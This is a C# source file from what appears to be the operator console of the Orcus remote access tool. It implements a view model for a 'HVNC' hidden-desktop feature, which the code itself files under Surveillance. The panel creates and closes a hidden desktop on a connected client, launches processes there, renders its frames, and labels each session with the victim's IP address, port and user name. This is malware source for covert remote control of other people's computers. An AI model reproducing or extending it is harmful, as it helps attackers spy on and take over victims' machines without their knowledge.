#if DEBUG
using System;
using System.Windows;
using Orcus.Administration.Commands.HVNC;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class HvncViewModel : CommandView
    {
        private RelayCommand _closeDesktopCommand;
        private double _currentFps;
        private Window _hvncWindow;
        private bool _isRunning;
        private RelayCommand _openDesktopCommand;
        private RelayCommand _openProcessCommand;
        private RenderEngine _renderEngine;

        public override string Name { get; } = "HVNC";
        public override Category Category { get; } = Category.Surveillance;

        public HvncCommand HvncCommand { get; private set; }

        public bool IsRunning
        {
            get { return _isRunning; }
            set { SetProperty(value, ref _isRunning); }
        }

        public double CurrentFps
        {
            get { return _currentFps; }
            set { SetProperty(value, ref _currentFps); }
        }

        public RenderEngine RenderEngine
        {
            get { return _renderEngine; }
            set { SetProperty(value, ref _renderEngine); }
        }

        public RelayCommand OpenDesktopCommand
        {
            get
            {
                return _openDesktopCommand ?? (_openDesktopCommand = new RelayCommand(parameter =>
                {
                    if (IsRunning)
                        return;

                    var paramters = (object[]) parameter;
                    var desktopName = (string) paramters[0];
                    var openExplorer = (bool) paramters[1];
                    HvncCommand.CreateDesktop(desktopName, openExplorer);
                }));
            }
        }

        public RelayCommand CloseDesktopCommand
        {
            get
            {
                return _closeDesktopCommand ?? (_closeDesktopCommand = new RelayCommand(parameter =>
                {
                    if (!IsRunning)
                        return;

                    HvncCommand.CloseDesktop();
                }));
            }
        }

        public RelayCommand OpenProcessCommand
        {
            get
            {
                return _openProcessCommand ?? (_openProcessCommand = new RelayCommand(parameter =>
                {
                    var processName = (string) parameter;
                    if (processName == null)
                        return;

                    HvncCommand.OpenProcess(processName);
                }));
            }
        }

        public override void Dispose()
        {
            base.Dispose();
            _hvncWindow?.Close();
            _hvncWindow = null;
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            HvncCommand = clientController.Commander.GetCommand<HvncCommand>();
            HvncCommand.IsOpenChanged += HvncCommandOnIsOpenChanged;
            HvncCommand.RenderEngineUpdated += HvncCommandOnRenderEngineUpdated;
        }

        private void HvncCommandOnRenderEngineUpdated(object sender, EventArgs eventArgs)
        {
            RenderEngine = HvncCommand.RenderEngine;
            if (RenderEngine != null)
            {
                RenderEngine.Start();
                RenderEngine.FrameRatePerSecondUpdate += RenderEngineOnFrameRatePerSecondUpdate;
            }
        }

        private void RenderEngineOnFrameRatePerSecondUpdate(object sender, double i)
        {
            CurrentFps = Math.Ceiling(i);
        }

        private void HvncCommandOnIsOpenChanged(object sender, EventArgs eventArgs)
        {
            IsRunning = HvncCommand.IsOpen;
            Application.Current.Dispatcher.Invoke(() =>
            {
                if (IsRunning)
                {
                  /*  _hvncWindow = new HvncWindow(this)
                    {
                        Title =
                            $"HVNC - {ClientController.Client.IpAddress}:{ClientController.Client.Port} ({ClientController.Client.UserName})"
                    };
                    _hvncWindow.Closed += (s, e) =>
                    {
                        _hvncWindow = null;
                        HvncCommand.CloseDesktop();
                    };
                    _hvncWindow.Show();*/
                }
                else
                {
                    if (_hvncWindow != null)
                    {
                        _hvncWindow.Close();
                        _hvncWindow = null;
                    }
                }
            });
        }
    }
}

#endif